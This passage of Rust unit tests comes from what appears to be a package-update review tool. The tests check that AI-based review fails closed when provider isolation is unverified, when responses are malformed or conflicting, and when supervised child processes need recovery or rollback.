        assert!(gate.recover_fixture_source_after_direct_exit().is_err());
        assert!(crate::recovery_state::codex_recovery_preflight_at(&state).is_err());
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        let mut config = Config::default();
        config.security.review_provider = Some("codex".into());
        assert!(model_command(&config, "synthetic").is_none());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn refused_fixture_admission_remains_pending_after_supervisor_exit() {
        use std::process::{Command, Stdio};
        let root = tempfile::tempdir().unwrap();
        let child = Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "review::tests::persistent_fixture_refuses_admission_without_delegated_cgroup",
            ])
            .env_clear()
            .env("HOME", root.path())
            .env("TMPDIR", root.path())
            .env("TUCUPI_ADMISSION_REOPEN_ROOT", root.path())
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .unwrap();
        assert!(child.success(), "fixture supervisor failed: {child}");
        let location = std::fs::read_to_string(root.path().join("fixture-location")).unwrap();
        let state = std::path::Path::new(&location).join("state");
        let intent = std::fs::read(state.join("pending-intent")).unwrap();
        let snapshot = std::fs::read(state.join("pending-snapshot")).unwrap();
        let postimage = std::fs::read(state.join("pending-fixture-postimage")).unwrap();
        assert!(!state.join("pending-exit").exists());
        assert!(crate::recovery_state::codex_recovery_preflight_at(&state).is_err());
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert!(crate::same_user_supervisor::PendingAttempt::begin(
            &state,
            "0123456789abcdef0123456789abcdef"
        )
        .is_err());
        assert_eq!(std::fs::read(state.join("pending-intent")).unwrap(), intent);
        assert_eq!(
            std::fs::read(state.join("pending-snapshot")).unwrap(),
            snapshot
        );
        assert_eq!(
            std::fs::read(state.join("pending-fixture-postimage")).unwrap(),
            postimage
        );
        assert!(!state.join("pending-exit").exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_spawn_does_not_run_script_when_admission_fails() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("executed");
        let script = dir.path().join("synthetic.py");
        std::fs::write(
            &script,
            format!("from pathlib import Path\nPath({:?}).touch()\n", marker),
        )
        .unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(dir.path()).unwrap();
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        assert!(FixtureSupervisedChild::spawn_fixture_with_observation(
            observation,
            dir.path(),
            dir.path(),
            &script,
            false,
            &gate,
            || Ok(())
        )
        .is_err());
        assert!(!marker.exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_start_gate_rejects_release_after_cancellation() {
        let gate = FixtureStartGate::default();
        gate.cancel().unwrap();
        let mut output = Vec::new();
        assert_eq!(gate.release(&mut output), Err("fixture startup cancelled"));
        assert!(output.is_empty());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_start_gate_remembers_failed_cancellation() {
        let gate = FixtureStartGate::default();
        gate.begin_fixture_start().unwrap();
        let full = std::fs::OpenOptions::new()
            .write(true)
            .open("/dev/full")
            .unwrap();
        gate.attach_synthetic_kill(full).unwrap();
        assert_eq!(gate.cancel(), Err("fixture cancellation unavailable"));
        assert_eq!(gate.cancel(), Err("fixture cancellation unavailable"));
        let mut output = Vec::new();
        assert_eq!(gate.release(&mut output), Err("fixture startup cancelled"));
        assert!(output.is_empty());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn fixture_attempt_invalid_response_does_not_prevent_cancellation_or_allow_late_response() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("cgroup.events"), "populated 1\n").unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(dir.path()).unwrap();
        let mut attempt =
            FixtureReviewAttempt::start(crate::codex_supervision::CgroupSequence::new(observation))
                .unwrap();
        assert!(attempt.receive(b"invalid synthetic response").is_err());
        assert!(attempt.receive(b"second response").is_err());
        // The path is not the delegated fixture group, so cancellation fails
        // closed. Its state still prevents late results or a second attempt.
        assert!(attempt.cancel().is_err());
        assert!(attempt.receive(b"late response").is_err());
        assert!(attempt.cancel().is_err());
        assert!(attempt.observe().is_err());
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn codex_pending_rejects_initially_empty_cgroup() {
        let body = format!(
            "data: {}\n\n",
            serde_json::json!({
                "type": "response.completed",
                "response": {"status": "completed", "output": [{
                    "type": "message", "role": "assistant", "content": [{
                        "type": "output_text", "text": "VERDICT: review\nREASON: synthetic"
                    }]
                }]}
            })
        );
        let pending = parse_codex_review_response(body.as_bytes()).unwrap();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("cgroup.events"), "populated 0\n").unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(dir.path()).unwrap();
        let sequence = crate::codex_supervision::CgroupSequence::new(observation);
        assert!(pending.bind_cgroup(sequence).is_err());
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn model_spawn_retries_temporarily_busy_executable() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let executable = dir.path().join("synthetic-model");
        std::fs::write(&executable, "#!/bin/sh\nprintf 'synthetic'\n").unwrap();
        std::fs::set_permissions(&executable, std::fs::Permissions::from_mode(0o700)).unwrap();
        let writer = std::fs::OpenOptions::new()
            .write(true)
            .open(&executable)
            .unwrap();
        assert_eq!(
            std::process::Command::new(&executable)
                .spawn()
                .unwrap_err()
                .raw_os_error(),
            Some(26)
        );
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(25)).await;
            drop(writer);
        });
        let output = run_model_command(executable.to_str().unwrap(), &[], None)
            .await
            .unwrap();
        assert_eq!(output.stdout, b"synthetic");
        let writer = std::fs::OpenOptions::new()
            .write(true)
            .open(&executable)
            .unwrap();
        assert!(tokio::time::timeout(
            Duration::from_secs(2),
            run_model_command(executable.to_str().unwrap(), &[], None)
        )
        .await
        .unwrap()
        .is_err());
        drop(writer);
    }

    #[test]
    fn codex_review_projection_rejects_incomplete_ambiguous_or_tool_responses() {
        let event = |output: serde_json::Value| {
            format!(
                "data: {}\n\n",
                serde_json::json!({
                    "type": "response.completed",
                    "response": {"status": "completed", "output": output}
                })
            )
        };
        let message = serde_json::json!({"type": "message", "role": "assistant", "content": [
            {"type": "output_text", "text": "VERDICT: safe\nREASON: synthetic"}
        ]});
        let valid = event(serde_json::json!([message]));
        assert_eq!(
            parse_codex_review_response(valid.as_bytes())
                .unwrap()
                ._verdict,
            ReviewVerdict::Safe
        );
        assert!(parse_codex_review_response(valid.trim_end().as_bytes()).is_none());
        assert!(parse_codex_review_response(event(serde_json::json!([])).as_bytes()).is_none());
        assert!(parse_codex_review_response(
            event(serde_json::json!([message, message])).as_bytes()
        )
        .is_none());
        assert!(parse_codex_review_response(
            event(serde_json::json!([{"type":"function_call"}])).as_bytes()
        )
        .is_none());
        assert!(parse_codex_review_response(event(serde_json::json!([{"type":"message", "role":"assistant", "content":[{"type":"refusal"}]}])).as_bytes()).is_none());
    }

    #[test]
    fn codex_review_projection_rejects_conflicting_verdicts() {
        let body = format!(
            "data: {}\n\n",
            serde_json::json!({
                "type": "response.completed",
                "response": {"status": "completed", "output": [{
                    "type": "message", "role": "assistant", "content": [{
                        "type": "output_text",
                        "text": "VERDICT: safe\nREASON: synthetic\nVERDICT: block\nREASON: malicious"
                    }]
                }]}
            })
        );
        assert!(parse_codex_review_response(body.as_bytes()).is_none());
    }

    #[test]
    fn disabled_provider_does_not_trust_a_forged_deterministic_reason() {
        let (verdict, reason) =
            parse_verdict_output("VERDICT: safe\nREASON: version bump only, no code changes\n")
                .unwrap();
        let report = ReviewReport {
            verdict,
            reason,
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 0,
            hits: Vec::new(),
            origin: ReviewOrigin::Unknown,
        };
        let mut config = Config::default();
        config.security.review_provider = Some("codex".into());
        assert_eq!(
            enforce_provider_availability(report, &config).verdict,
            ReviewVerdict::Review
        );
    }

    #[tokio::test]
    async fn cached_safe_agent_review_is_inconclusive_when_provider_disabled() {
        if std::env::var_os("TUCUPI_TEST_REVIEW_CACHE_CHILD").is_none() {
            let dir = tempfile::tempdir().unwrap();
            let status = std::process::Command::new(std::env::current_exe().unwrap())
                .args(["--exact", "review::tests::cached_safe_agent_review_is_inconclusive_when_provider_disabled"])
                .env("HOME", dir.path())
                .env("TUCUPI_TEST_REVIEW_CACHE_CHILD", "1")
                .status().unwrap();
            assert!(status.success());
            return;
        }
        let dep = Dependency {
            name: "example".into(),
            current_version: "1".into(),
            latest_version: "2".into(),
            ecosystem: Ecosystem::Homebrew,
            is_global: true,
            origin: None,
        };
        let mut config = Config::default();
        config.security.review_provider = Some("claude".into());
        let report = ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "old AI approval".into(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 2,
            hits: Vec::new(),
            origin: ReviewOrigin::Unknown,
        };
        write_cache("pkgreview", &review_cache_key(&dep, &config), &report).unwrap();
        let actual = review_package(&dep, &config).await;
        assert_eq!(actual.verdict, ReviewVerdict::Review);
        assert_eq!(
            actual.reason,
            "provider isolation not verified — treat as unreviewed"
        );
        let clean = ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "version bump only, no code changes".into(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 0,
            hits: Vec::new(),
            origin: ReviewOrigin::DeterministicClean,
        };
        let mut stored = serde_json::to_value(&clean).unwrap();
        stored["origin"] = serde_json::json!("DeterministicClean");
        let restored: ReviewReport = serde_json::from_value(stored).unwrap();
        assert_eq!(restored.origin, ReviewOrigin::Unknown);
        assert_eq!(
            enforce_provider_availability(restored, &config).verdict,
            ReviewVerdict::Review
        );
        assert_eq!(
            enforce_provider_availability(clean, &config).verdict,
            ReviewVerdict::Safe
        );
        let blocked = ReviewReport {
            verdict: ReviewVerdict::Block,
            reason: "known indicator".into(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 2,
            hits: Vec::new(),
            origin: ReviewOrigin::Unknown,
        };
        assert_eq!(
            enforce_provider_availability(blocked, &config).verdict,
            ReviewVerdict::Block
        );
    }

    #[test]
    fn claude_provider_requires_verified_isolation() {
        let mut config = Config::default();
        config.security.review_provider = Some("claude".into());
        assert!(model_command(&config, "source content").is_none());
        config.security.review_model = Some("sonnet".into());
        assert!(model_command(&config, "source content").is_none());
    }

    #[test]
    fn review_provider_selection_is_explicit_and_unknown_fails_closed() {
        let mut config = Config::default();
        assert!(model_command(&config, "example").is_none());
        config.security.review_provider = Some("apple".into());
        let (program, args, input) = model_command(&config, "example").unwrap();
        assert_eq!(program, "/usr/bin/fm");
        assert_eq!(args, ["respond", "--model", "system", "--no-stream"]);
        assert_eq!(input.as_deref(), Some("example"));
        config.security.review_provider = Some("unknown".into());
        assert!(model_command(&config, "example").is_none());
    }

    #[tokio::test]
    async fn unsupported_agent_providers_never_start_a_review() {
        for provider in ["opencode", "claude", "codex", "agy", "grok", "grok-build"] {
            let mut config = Config::default();
            config.security.review_provider = Some(provider.to_string());
            config.security.codex_auth_mode = Some(crate::config::CodexAuthMode::ApiKey);
            assert!(model_command(&config, "untrusted package source").is_none());
            assert!(llm_verdict(&config, "untrusted package source")
                .await
                .is_none());
            assert_eq!(
                unavailable_review_reason(&config),
                "provider isolation not verified — treat as unreviewed"
            );
        }
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn codex_dispatch_stays_disabled_with_supervised_pending_state() {
        use std::cell::Cell;
        use std::io::Write;
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        use std::time::{Duration, Instant};
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let pending = crate::same_user_supervisor::PendingAttempt::begin(
            &state,
            "0123456789abcdef0123456789abcdef",
        )
        .unwrap();
        pending.store_synthetic_snapshot(b"synthetic only").unwrap();
        let mut child = Command::new("/bin/sh")
            .args(["-c", "IFS= read -r line; exit 0"])
            .env_clear()
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();
        let mut input = child.stdin.take().unwrap();
        let mut observed = pending.bind_child(&mut child).unwrap();
        let mut config = Config::default();
        config.security.review_provider = Some("codex".into());
        let called = Cell::new(false);
        let verdict = llm_verdict_with_recovery_preflight(&config, "synthetic source", || {
            called.set(true);
            crate::recovery_state::codex_recovery_preflight_at(&state)
        })
        .await;
        assert!(called.get());
        assert!(verdict.is_none());
        assert!(!observed.permits_operation());
        input.write_all(b"go\n").unwrap();
        let deadline = Instant::now() + Duration::from_secs(2);
        loop {
            if let Some(success) = observed.poll_and_record_exit().unwrap() {
                assert!(success);
                break;
            }
            assert!(Instant::now() < deadline, "synthetic child did not exit");
            std::thread::sleep(Duration::from_millis(10));
        }
        let exit = std::fs::read(state.join("pending-exit")).unwrap();
        assert!(
            llm_verdict_with_recovery_preflight(&config, "synthetic source", || Ok(()))
                .await
                .is_none()
        );
        assert_eq!(std::fs::read(state.join("pending-exit")).unwrap(), exit);
        assert!(model_command(&config, "synthetic source").is_none());
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.direct_exit,
            crate::same_user_supervisor::DirectExitObservation::SuccessRecorded
        );
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert!(crate::same_user_supervisor::PendingAttempt::begin(
            &state,
            "0123456789abcdef0123456789abcdef"
        )
        .is_err());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[tokio::test]
    async fn synthetic_gated_review_cannot_enable_codex_after_exit() {
        synthetic_gated_review_case(true, true, false).await;
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[tokio::test]
    async fn synthetic_gated_review_recovery_with_invalid_response() {
        synthetic_gated_review_case(false, true, false).await;
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[tokio::test]
    async fn synthetic_gated_review_recovery_with_failed_child() {
        synthetic_gated_review_case(true, false, false).await;
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[tokio::test]
    async fn synthetic_gated_review_recovery_after_failed_cancellation() {
        synthetic_gated_review_case(true, true, true).await;
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    async fn synthetic_gated_review_case(
        valid_response: bool,
        successful_exit: bool,
        cancel: bool,
    ) {
        use crate::same_user_supervisor::SyntheticTargetObservation;
        use std::io::Read;
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let source = tempfile::tempdir_in(root.path()).unwrap();
        let source_path = source.path().to_path_buf();
        std::fs::write(source.path().join("Cargo.toml"), b"synthetic original").unwrap();
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let gate = FixtureStartGate::with_synthetic_recovery_plan(
            directory,
            source,
            b"synthetic modified".to_vec(),
        );
        gate.begin_fixture_start().unwrap();
        let valid_event = format!(
            "data: {}",
            serde_json::json!({
                "type": "response.completed", "response": {"status": "completed", "output": [{
                    "type": "message", "role": "assistant", "content": [{"type": "output_text", "text": "VERDICT: safe\nREASON: synthetic"}]
                }]}
            })
        );
        let event = if valid_response {
            valid_event
        } else {
            "invalid synthetic response".to_owned()
        };
        let mut spawned = gate
            .start_fixture_child(|| {
                Command::new("/bin/sh")
                    .args([
                        "-c",
                        "IFS= read -r line; [ \"$line\" = 1 ] || exit 90; printf '%s' 'synthetic modified' > \"$2/Cargo.toml\"; printf '%s\\n\\n' \"$1\"; exit \"$3\"",
                        "fixture",
                        &event,
                    ])
                    .arg(&source_path)
                    .arg(if successful_exit { "0" } else { "7" })
                    .env_clear()
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::null())
                    .spawn()
            })
            .unwrap();
        let context = gate
            .record_same_user_child(spawned.child.as_mut().unwrap())
            .unwrap();
        gate.attach_synthetic_kill(tempfile::tempfile_in(root.path()).unwrap())
            .unwrap();
        let mut pipe = spawned.child.as_mut().unwrap().stdin.take().unwrap();
        gate.release(&mut pipe).unwrap();
        drop(pipe);
        let group = root.path().join("fake-group");
        std::fs::create_dir(&group).unwrap();
        std::fs::write(group.join("cgroup.events"), b"populated 1\n").unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(&group).unwrap();
        let attempt =
            FixtureReviewAttempt::start(crate::codex_supervision::CgroupSequence::new(observation))
                .unwrap();
        let mut supervised = FixtureSupervisedChild {
            attempt,
            child: spawned.child.take().unwrap(),
            reaped: false,
            recovery_exit: context,
        };
        let mut response = Vec::new();
        supervised
            .child
            .stdout
            .take()
            .unwrap()
            .read_to_end(&mut response)
            .unwrap();
        assert_eq!(
            supervised.attempt.receive(&response).is_ok(),
            valid_response
        );
        assert_eq!(supervised.attempt._pending.is_some(), valid_response);
        assert!(supervised
            .inspect_fixture_review(&FixtureStartGate::default())
            .is_none());
        assert_eq!(supervised.child.wait().unwrap().success(), successful_exit);
        supervised.reaped = true;
        if cancel {
            gate.cancel().unwrap();
            // The fake cgroup cannot provide the expected cancellation handle.
            // A failed stop must still discard the quarantined response.
            assert!(supervised.attempt.cancel().is_err());
            assert!(supervised.attempt.receive(&response).is_err());
            assert!(supervised.attempt._pending.is_none());
        }
        let observation = supervised.inspect_fixture_review(&gate).unwrap();
        assert_eq!(observation.response_quarantined, valid_response && !cancel);
        assert_eq!(
            observation.rollback_target,
            SyntheticTargetObservation::UnavailableOrInvalid
        );
        assert_eq!(
            observation.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            std::fs::read(source_path.join("Cargo.toml")).unwrap(),
            b"synthetic modified"
        );
        assert!(gate.recover_fixture_source_after_direct_exit().is_err());
        assert_eq!(
            gate.inspect_fixture_source_after_rollback(),
            SyntheticTargetObservation::UnavailableOrInvalid
        );
        assert_eq!(
            std::fs::read(source_path.join("Cargo.toml")).unwrap(),
            b"synthetic modified"
        );
        supervised.record_reaped_exit().unwrap();
        let observation = supervised.inspect_fixture_review(&gate).unwrap();
        assert_eq!(
            observation.direct_exit,
            if successful_exit {
                crate::same_user_supervisor::DirectExitObservation::SuccessRecorded
            } else {
                crate::same_user_supervisor::DirectExitObservation::FailureRecorded
            }
        );
        assert_eq!(
            observation.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        let intent = std::fs::read(state.join("pending-intent")).unwrap();
        let exit = std::fs::read(state.join("pending-exit")).unwrap();
        std::fs::write(source_path.join("Cargo.toml"), b"unexpected").unwrap();
        assert!(gate.recover_fixture_source_after_direct_exit().is_err());
        assert_eq!(
            std::fs::read(source_path.join("Cargo.toml")).unwrap(),
            b"unexpected"
        );
        assert!(!state.join("pending-fixture-rollback").exists());
        std::fs::write(source_path.join("Cargo.toml"), b"synthetic modified").unwrap();
        let copy = gate.recover_fixture_source_after_direct_exit().unwrap();
        assert_eq!(
            gate.inspect_fixture_source_after_rollback(),
            SyntheticTargetObservation::MatchesSnapshot
        );
        let observation = supervised.inspect_fixture_review(&gate).unwrap();
        assert_eq!(observation.response_quarantined, valid_response && !cancel);
        assert_eq!(
            observation.rollback_target,
            SyntheticTargetObservation::MatchesSnapshot
        );
        assert_eq!(
            observation.resume_target,
            SyntheticTargetObservation::UnavailableOrInvalid
        );
        assert_eq!(
            observation.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            std::fs::read(source_path.join("Cargo.toml")).unwrap(),
            b"synthetic original"
        );
        assert_eq!(
            std::fs::read(copy.path().join("Cargo.toml")).unwrap(),
            b"synthetic original"
        );
        let check_replaced_directory = |resumed: bool| {
            let suffix = if resumed { "resume" } else { "rollback" };
            let replacement = root.path().join(format!("replacement-{suffix}"));
            let original = root.path().join(format!("original-{suffix}"));
            std::fs::create_dir(&replacement).unwrap();
            std::fs::set_permissions(&replacement, std::fs::Permissions::from_mode(0o700)).unwrap();
            for entry in std::fs::read_dir(&state).unwrap() {
                let entry = entry.unwrap();
                assert!(entry.file_type().unwrap().is_file());
                std::fs::copy(entry.path(), replacement.join(entry.file_name())).unwrap();
            }
            std::fs::rename(&state, &original).unwrap();
            std::fs::rename(&replacement, &state).unwrap();
            let directory = gate.same_user_recovery.as_ref().unwrap();
            let source = gate.synthetic_source.as_ref().unwrap();
            let (by_name, by_retained, by_gate) = if resumed {
                (
                    crate::same_user_supervisor::inspect_synthetic_resume_target(&state, source),
                    crate::same_user_supervisor::inspect_synthetic_resume_target_in(
                        &state, directory, source,
                    ),
                    gate.inspect_fixture_source_after_resume(),
                )
            } else {
                (
                    crate::same_user_supervisor::inspect_synthetic_rollback_target(&state, source),
                    crate::same_user_supervisor::inspect_synthetic_rollback_target_in(
                        &state, directory, source,
                    ),
                    gate.inspect_fixture_source_after_rollback(),
                )
            };
            assert_eq!(by_name, SyntheticTargetObservation::MatchesSnapshot);
            assert_eq!(
                by_retained,
                SyntheticTargetObservation::UnavailableOrInvalid
            );
            assert_eq!(by_gate, SyntheticTargetObservation::UnavailableOrInvalid);
            std::fs::rename(&state, &replacement).unwrap();
            std::fs::rename(&original, &state).unwrap();
        };
        check_replaced_directory(false);
        let result = std::fs::read(state.join("pending-fixture-rollback")).unwrap();
        std::fs::write(source_path.join("Cargo.toml"), b"later divergence").unwrap();
        assert_eq!(
            gate.inspect_fixture_source_after_rollback(),
            SyntheticTargetObservation::DiffersFromSnapshot
        );
        assert_eq!(
            std::fs::read(state.join("pending-fixture-rollback")).unwrap(),
            result
        );
        assert_eq!(
            std::fs::read(source_path.join("Cargo.toml")).unwrap(),
            b"later divergence"
        );
        let postimage = state.join("pending-fixture-postimage");
        let expected_postimage = std::fs::read(&postimage).unwrap();
        std::fs::write(&postimage, b"invalid").unwrap();
        assert_eq!(
            gate.inspect_fixture_source_after_rollback(),
            SyntheticTargetObservation::UnavailableOrInvalid
        );
        std::fs::write(&postimage, &expected_postimage).unwrap();
        assert!(gate.recover_fixture_source_after_direct_exit().is_err());
        let rollback = state.join("pending-fixture-rollback");
        // Simulate an interrupted fixture publication; retain its valid prefix.
        std::fs::write(&rollback, &result[..12]).unwrap();
        assert_eq!(
            gate.inspect_fixture_source_after_rollback(),
            SyntheticTargetObservation::UnavailableOrInvalid
        );
        assert_eq!(
            gate.inspect_fixture_source_after_resume(),
            SyntheticTargetObservation::UnavailableOrInvalid
        );
        assert!(gate.resume_fixture_source_after_direct_exit().is_err());
        assert_eq!(
            std::fs::read(source_path.join("Cargo.toml")).unwrap(),
            b"later divergence"
        );
        std::fs::write(source_path.join("Cargo.toml"), b"synthetic original").unwrap();
        std::fs::write(state.join("pending-exit"), b"invalid").unwrap();
        assert!(gate.resume_fixture_source_after_direct_exit().is_err());
        assert!(!state.join("pending-fixture-resume").exists());
        std::fs::write(state.join("pending-exit"), &exit).unwrap();
        gate.resume_fixture_source_after_direct_exit().unwrap();
        assert_eq!(
            gate.inspect_fixture_source_after_resume(),
            SyntheticTargetObservation::MatchesSnapshot
        );
        let observation = supervised.inspect_fixture_review(&gate).unwrap();
        assert_eq!(observation.response_quarantined, valid_response && !cancel);
        assert_eq!(
            observation.resume_target,
            SyntheticTargetObservation::MatchesSnapshot
        );
        assert_eq!(
            observation.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        check_replaced_directory(true);
        let mut config = Config::default();
        config.security.review_provider = Some("codex".into());
        let called = std::cell::Cell::new(false);
        assert!(llm_verdict_with_runner(
            &config,
            "synthetic source",
            || {
                called.set(true);
                Ok(())
            },
            |_, _, _| async { panic!("disabled Codex must not invoke the model runner") },
        )
        .await
        .is_none());
        assert!(called.get());
        assert_eq!(
            std::fs::read(source_path.join("Cargo.toml")).unwrap(),
            b"synthetic original"
        );
        assert_eq!(std::fs::read(&rollback).unwrap(), &result[..12]);
        std::fs::write(source_path.join("Cargo.toml"), b"new divergence").unwrap();
        assert_eq!(
            gate.inspect_fixture_source_after_resume(),
            SyntheticTargetObservation::DiffersFromSnapshot
        );
        assert!(gate.resume_fixture_source_after_direct_exit().is_err());
        assert!(
            llm_verdict_with_recovery_preflight(&config, "synthetic source", || {
                crate::recovery_state::codex_recovery_preflight_at(&state)
            })
            .await
            .is_none()
        );
        assert!(
            llm_verdict_with_recovery_preflight(&config, "synthetic source", || Ok(()))
                .await
                .is_none()
        );
        assert!(model_command(&config, "synthetic source").is_none());
        assert_eq!(std::fs::read(state.join("pending-intent")).unwrap(), intent);
        assert_eq!(std::fs::read(state.join("pending-exit")).unwrap(), exit);
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.direct_exit,
            if successful_exit {
                crate::same_user_supervisor::DirectExitObservation::SuccessRecorded
            } else {
                crate::same_user_supervisor::DirectExitObservation::FailureRecorded
            }
        );
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert!(crate::same_user_supervisor::PendingAttempt::begin(
            &state,
            "0123456789abcdef0123456789abcdef"
        )
        .is_err());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[tokio::test]
    async fn recovered_fixture_state_keeps_source_reviews_inconclusive() {
        use std::io::Write;
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        use std::time::Instant;
        const WORKER: &str = "TUCUPI_LOCAL_REVIEW_WORKER";
        const ATTEMPT: &str = "0123456789abcdef0123456789abcdef";
        if let Some(root) = std::env::var_os(WORKER) {
            let state = std::path::Path::new(&root).join("tucupi/recovery");
            assert!(crate::recovery_state::codex_recovery_preflight_at(&state).is_err());
            let inspection = crate::same_user_supervisor::inspect_recovery(&state);
            assert_eq!(
                inspection.direct_exit,
                crate::same_user_supervisor::DirectExitObservation::SuccessRecorded
            );
            assert_eq!(
                crate::same_user_supervisor::inspect_synthetic_rollback(&state),
                crate::same_user_supervisor::SyntheticRollbackObservation::RecordObserved
            );
            let dep = Dependency {
                name: "synthetic-package".into(),
                current_version: "1".into(),
                latest_version: "2".into(),
                ecosystem: Ecosystem::Pacman,
                is_global: false,
                origin: Some(PackageOrigin::Aur),
            };
            let mut config = Config::default();
            config.security.review_provider = Some("codex".into());
            config.security.review_llm = Some(true);
            let report = review_pkgbuild_with_sources(
                &dep,
                &config,
                &FixtureStartGate::default(),
                PkgbuildSources {
                    baseline: Some("pkgver=1\npackage() { echo before; }\n".into()),
                    current: "pkgver=2\npackage() { echo after; }\n".into(),
                    install_files: String::new(),
                },
            )
            .await;
            assert_eq!(report.verdict, ReviewVerdict::Review);
            assert!(report.residual_line_count > 0);
            assert_eq!(report.reason, unavailable_review_reason(&config));
            let formula_dep = Dependency {
                name: "synthetic-formula".into(),
                current_version: "1".into(),
                latest_version: "2".into(),
                ecosystem: Ecosystem::Homebrew,
                is_global: true,
                origin: None,
            };
            let formula = review_formula_with_sources(
                &formula_dep,
                &config,
                &FixtureStartGate::default(),
                FormulaSources {
                    baseline: Some("class Synthetic < Formula\n  def install\n    system \"before\"\n  end\nend\n".into()),
                    current: "class Synthetic < Formula\n  def install\n    system \"after\"\n  end\nend\n".into(),
                    tap: "homebrew/core".into(),
                    path: "Formula/synthetic.rb".into(),
                },
            ).await;
            assert_eq!(formula.verdict, ReviewVerdict::Review);
            assert!(formula.residual_line_count > 0);
            assert_eq!(formula.reason, unavailable_review_reason(&config));
            for cached_dep in [&dep, &formula_dep] {
                assert!(needs_review(cached_dep));
                let cached = ReviewReport {
                    verdict: ReviewVerdict::Safe,
                    reason: "synthetic old model approval".into(),
                    view_mode: ReviewViewMode::Diff,
                    residual_line_count: 1,
                    hits: Vec::new(),
                    origin: ReviewOrigin::Unknown,
                };
                let key = review_cache_key(cached_dep, &config);
                write_cache("pkgreview", &key, &cached).unwrap();
                assert!(read_cache::<ReviewReport>(
                    "pkgreview",
                    &key,
                    Duration::from_secs(REVIEW_CACHE_TTL_SECS)
                )
                .is_some());
                let actual = review_package(cached_dep, &config).await;
                assert_eq!(actual.verdict, ReviewVerdict::Review);
                assert_eq!(actual.reason, unavailable_review_reason(&config));
            }
            assert!(model_command(&config, "synthetic").is_none());
            return;
        }
        let root = tempfile::tempdir().unwrap();
        let parent = root.path().join("tucupi");
        std::fs::create_dir(&parent).unwrap();
        std::fs::set_permissions(&parent, std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(&parent, std::ffi::OsStr::new("recovery"))
            .unwrap();
        let state = parent.join("recovery");
        let source = tempfile::tempdir_in(root.path()).unwrap();
